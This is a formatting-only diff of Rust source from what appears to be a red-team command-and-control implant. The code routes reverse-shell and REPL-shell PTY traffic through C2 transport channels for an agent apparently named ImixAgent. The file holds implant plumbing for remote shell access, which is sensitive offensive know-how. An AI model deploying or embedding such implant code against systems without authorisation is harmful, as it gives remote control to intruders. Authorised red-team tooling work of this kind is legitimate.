@@ -9,7 +9,7 @@ use std::time::{SystemTime, UNIX_EPOCH};
 use tokio::sync::mpsc;
 use transport::Transport;
 
-use super::{bytes, tcp, udp, shell, repl};
+use super::{bytes, repl, shell, tcp, udp};
 use crate::agent::ImixAgent;
 
 /// Context for a single stream ID
@@ -154,7 +154,9 @@ async fn handle_incoming_mote<T: Transport + Send + Sync + 'static>(
         let agent_clone = agent.clone();
 
         let task = tokio::spawn(async move {
-            if let Err(e) = stream_handler(stream_id_clone, rx, out_tx_clone, task_id, agent_clone).await {
+            if let Err(e) =
+                stream_handler(stream_id_clone, rx, out_tx_clone, task_id, agent_clone).await
+            {
                 #[cfg(debug_assertions)]
                 log::error!("Stream handler error: {}", e);
             }
@@ -248,7 +250,7 @@ async fn stream_handler<T: Transport + Send + Sync + 'static>(
                 // Mote(ShellPayload) -> shell_input_tx -> ReverseShellResponse -> pty
                 // pty -> ReverseShellRequest -> shell_output_tx -> Mote(ShellPayload) -> out_tx
 
-                use pb::c2::{ReverseShellRequest, ReverseShellResponse, ReverseShellMessageKind};
+                use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse};
 
                 let (pty_req_tx, mut pty_req_rx) = mpsc::channel::<ReverseShellRequest>(100);
                 let (pty_resp_tx, pty_resp_rx) = mpsc::channel::<ReverseShellResponse>(100);
@@ -260,15 +262,20 @@ async fn stream_handler<T: Transport + Send + Sync + 'static>(
                     while let Some(req) = pty_req_rx.recv().await {
                         // Check kind
                         match ReverseShellMessageKind::try_from(req.kind).ok() {
-                             Some(ReverseShellMessageKind::Data) => {
-                                 let mote = sequencer_clone.new_shell_mote(req.data);
-                                 if out_tx_clone.send(mote).await.is_err() { break; }
-                             }
-                             Some(ReverseShellMessageKind::Ping) => {
-                                 let mote = sequencer_clone.new_bytes_mote(req.data, BytesPayloadKind::Ping);
-                                 if out_tx_clone.send(mote).await.is_err() { break; }
-                             }
-                             _ => {}
+                            Some(ReverseShellMessageKind::Data) => {
+                                let mote = sequencer_clone.new_shell_mote(req.data);
+                                if out_tx_clone.send(mote).await.is_err() {
+                                    break;
+                                }
+                            }
+                            Some(ReverseShellMessageKind::Ping) => {
+                                let mote = sequencer_clone
+                                    .new_bytes_mote(req.data, BytesPayloadKind::Ping);
+                                if out_tx_clone.send(mote).await.is_err() {
+                                    break;
+                                }
+                            }
+                            _ => {}
                         }
                     }
                 });
@@ -284,7 +291,9 @@ async fn stream_handler<T: Transport + Send + Sync + 'static>(
                             kind: ReverseShellMessageKind::Data.into(),
                             data,
                         };
-                        if pty_resp_tx.send(resp).await.is_err() { break; }
+                        if pty_resp_tx.send(resp).await.is_err() {
+                            break;
+                        }
                     }
                 });
 
@@ -324,24 +333,61 @@ async fn stream_handler<T: Transport + Send + Sync + 'static>(
                         let req_tx = self.req_tx.clone();
                         tokio::spawn(async move {
                             while let Some(req) = output_rx.recv().await {
-                                if req_tx.send(req).await.is_err() { break; }
+                                if req_tx.send(req).await.is_err() {
+                                    break;
+                                }
                             }
                         });
 
                         // Bridge resp_rx -> input_tx
                         let mut resp_rx = self.resp_rx.lock().await;
                         while let Some(resp) = resp_rx.recv().await {
-                            if input_tx.send(resp).await.is_err() { break; }
+                            if input_tx.send(resp).await.is_err() {
+                                break;
+                            }
                         }
                         Ok(())
                     }
-                     // Implement other methods as todo!()
-                    async fn check_in(&self, _: pb::c2::CheckInRequest) -> Result<pb::c2::CheckInResponse> { todo!() }
-                    async fn get_task(&self, _: pb::c2::GetTaskRequest) -> Result<pb::c2::GetTaskResponse> { todo!() }
-                    async fn report_task_output(&self, _: pb::c2::ReportTaskOutputRequest) -> Result<pb::c2::ReportTaskOutputResponse> { todo!() }
-                    async fn download_file(&self, _: pb::c2::DownloadFileRequest) -> Result<Box<dyn std::io::Read + Send + Sync + 'static>> { todo!() }
-                    async fn upload_file(&self, _: String, _: Box<dyn std::io::Read + Send + Sync + 'static>) -> Result<()> { todo!() }
-                    async fn create_portal(&self, _: mpsc::Receiver<CreatePortalRequest>, _: mpsc::Sender<CreatePortalResponse>) -> Result<()> { todo!() }
+                    // Implement other methods as todo!()
+                    async fn check_in(
+                        &self,
+                        _: pb::c2::CheckInRequest,
+                    ) -> Result<pb::c2::CheckInResponse> {
+                        todo!()
+                    }
+                    async fn get_task(
+                        &self,
+                        _: pb::c2::GetTaskRequest,
+                    ) -> Result<pb::c2::GetTaskResponse> {
+                        todo!()
+                    }
+                    async fn report_task_output(
+                        &self,
+                        _: pb::c2::ReportTaskOutputRequest,
+                    ) -> Result<pb::c2::ReportTaskOutputResponse> {
+                        todo!()
+                    }
+                    async fn download_file(
+                        &self,
+                        _: pb::c2::DownloadFileRequest,
+                    ) -> Result<Box<dyn std::io::Read + Send + Sync + 'static>>
+                    {
+                        todo!()
+                    }
+                    async fn upload_file(
+                        &self,
+                        _: String,
+                        _: Box<dyn std::io::Read + Send + Sync + 'static>,
+                    ) -> Result<()> {
+                        todo!()
+                    }
+                    async fn create_portal(
+                        &self,
+                        _: mpsc::Receiver<CreatePortalRequest>,
+                        _: mpsc::Sender<CreatePortalResponse>,
+                    ) -> Result<()> {
+                        todo!()
+                    }
                 }
 
                 let transport_mock = ChannelTransport {
@@ -352,17 +398,21 @@ async fn stream_handler<T: Transport + Send + Sync + 'static>(
                 // Spawn PTY
                 let task_id_clone = task_id;
                 tokio::spawn(async move {
-                     let _ = crate::shell::run_reverse_shell_pty(task_id_clone, None, transport_mock).await;
+                    let _ =
+                        crate::shell::run_reverse_shell_pty(task_id_clone, None, transport_mock)
+                            .await;
                 });
 
                 // Run Handler
                 shell::handle_shell(first_mote, rx, out_tx, sequencer, shell_input_tx).await
-            },
+            }
             Payload::Repl(_) => {
                 // Similar to Shell, but with run_repl_reverse_shell
                 let (repl_input_tx, mut repl_input_rx) = mpsc::channel::<Vec<u8>>(100);
-                let (repl_req_tx, mut repl_req_rx) = mpsc::channel::<pb::c2::ReverseShellRequest>(100);
-                let (repl_resp_tx, repl_resp_rx) = mpsc::channel::<pb::c2::ReverseShellResponse>(100);
+                let (repl_req_tx, mut repl_req_rx) =
+                    mpsc::channel::<pb::c2::ReverseShellRequest>(100);
+                let (repl_resp_tx, repl_resp_rx) =
+                    mpsc::channel::<pb::c2::ReverseShellResponse>(100);
 
                 // Adapter PTY Output -> Mote
                 let out_tx_clone = out_tx.clone();
@@ -370,27 +420,34 @@ async fn stream_handler<T: Transport + Send + Sync + 'static>(
                 tokio::spawn(async move {
                     while let Some(req) = repl_req_rx.recv().await {
                         match ReverseShellMessageKind::try_from(req.kind).ok() {
-                             Some(ReverseShellMessageKind::Data) => {
-                                 let mote = sequencer_clone.new_repl_mote(req.data);
-                                 if out_tx_clone.send(mote).await.is_err() { break; }
-                             }
-                             Some(ReverseShellMessageKind::Ping) => {
-                                 let mote = sequencer_clone.new_bytes_mote(req.data, BytesPayloadKind::Ping);
-                                 if out_tx_clone.send(mote).await.is_err() { break; }
-                             }
-                             _ => {}
+                            Some(ReverseShellMessageKind::Data) => {
+                                let mote = sequencer_clone.new_repl_mote(req.data);
+                                if out_tx_clone.send(mote).await.is_err() {
+                                    break;
+                                }
+                            }
+                            Some(ReverseShellMessageKind::Ping) => {
+                                let mote = sequencer_clone
+                                    .new_bytes_mote(req.data, BytesPayloadKind::Ping);
+                                if out_tx_clone.send(mote).await.is_err() {
+                                    break;
+                                }
+                            }
+                            _ => {}
                         }
                     }
                 });
 
-                 // Adapter Mote -> PTY Input
+                // Adapter Mote -> PTY Input
                 tokio::spawn(async move {
                     while let Some(data) = repl_input_rx.recv().await {
                         let resp = pb::c2::ReverseShellResponse {
                             kind: ReverseShellMessageKind::Data.into(),
                             data,
                         };
-                        if repl_resp_tx.send(resp).await.is_err() { break; }
+                        if repl_resp_tx.send(resp).await.is_err() {
+                            break;
+                        }
                     }
                 });
 
@@ -419,26 +476,63 @@ async fn stream_handler<T: Transport + Send + Sync + 'static>(
                         mut output_rx: mpsc::Receiver<pb::c2::ReverseShellRequest>,
                         input_tx: mpsc::Sender<pb::c2::ReverseShellResponse>,
                     ) -> Result<()> {
-                         // Bridge
+                        // Bridge
                         let req_tx = self.req_tx.clone();
                         tokio::spawn(async move {
                             while let Some(req) = output_rx.recv().await {
-                                if req_tx.send(req).await.is_err() { break; }
+                                if req_tx.send(req).await.is_err() {
+                                    break;
+                                }
                             }
                         });
                         let mut resp_rx = self.resp_rx.lock().await;
                         while let Some(resp) = resp_rx.recv().await {
-                            if input_tx.send(resp).await.is_err() { break; }
+                            if input_tx.send(resp).await.is_err() {
+                                break;
+                            }
                         }
                         Ok(())
                     }
-                     // Implement other methods as todo!() - REPL only uses reverse_shell on this transport arg
-                    async fn check_in(&self, _: pb::c2::CheckInRequest) -> Result<pb::c2::CheckInResponse> { todo!() }
-                    async fn get_task(&self, _: pb::c2::GetTaskRequest) -> Result<pb::c2::GetTaskResponse> { todo!() }
-                    async fn report_task_output(&self, _: pb::c2::ReportTaskOutputRequest) -> Result<pb::c2::ReportTaskOutputResponse> { todo!() }
-                    async fn download_file(&self, _: pb::c2::DownloadFileRequest) -> Result<Box<dyn std::io::Read + Send + Sync + 'static>> { todo!() }
-                    async fn upload_file(&self, _: String, _: Box<dyn std::io::Read + Send + Sync + 'static>) -> Result<()> { todo!() }
-                    async fn create_portal(&self, _: mpsc::Receiver<CreatePortalRequest>, _: mpsc::Sender<CreatePortalResponse>) -> Result<()> { todo!() }
+                    // Implement other methods as todo!() - REPL only uses reverse_shell on this transport arg
+                    async fn check_in(
+                        &self,
+                        _: pb::c2::CheckInRequest,
+                    ) -> Result<pb::c2::CheckInResponse> {
+                        todo!()
+                    }
+                    async fn get_task(
+                        &self,
+                        _: pb::c2::GetTaskRequest,
+                    ) -> Result<pb::c2::GetTaskResponse> {
+                        todo!()
+                    }
+                    async fn report_task_output(
+                        &self,
+                        _: pb::c2::ReportTaskOutputRequest,
+                    ) -> Result<pb::c2::ReportTaskOutputResponse> {
+                        todo!()
+                    }
+                    async fn download_file(
+                        &self,
+                        _: pb::c2::DownloadFileRequest,
+                    ) -> Result<Box<dyn std::io::Read + Send + Sync + 'static>>
+                    {
+                        todo!()
+                    }
+                    async fn upload_file(
+                        &self,
+                        _: String,
+                        _: Box<dyn std::io::Read + Send + Sync + 'static>,
+                    ) -> Result<()> {
+                        todo!()
+                    }
+                    async fn create_portal(
+                        &self,
+                        _: mpsc::Receiver<CreatePortalRequest>,
+                        _: mpsc::Sender<CreatePortalResponse>,
+                    ) -> Result<()> {
+                        todo!()
+                    }
                 }
 
                 let transport_mock = ChannelTransport {
@@ -450,11 +544,16 @@ async fn stream_handler<T: Transport + Send + Sync + 'static>(
                 let task_id_clone = task_id;
                 let agent_clone = agent.clone();
                 tokio::spawn(async move {
-                     let _ = crate::shell::run_repl_reverse_shell(task_id_clone, transport_mock, agent_clone).await;
+                    let _ = crate::shell::run_repl_reverse_shell(
+                        task_id_clone,
+                        transport_mock,
+                        agent_clone,
+                    )
+                    .await;
                 });
 
                 repl::handle_repl(first_mote, rx, out_tx, sequencer, task_id, repl_input_tx).await
-            },
+            }
         }
     } else {
         Ok(())
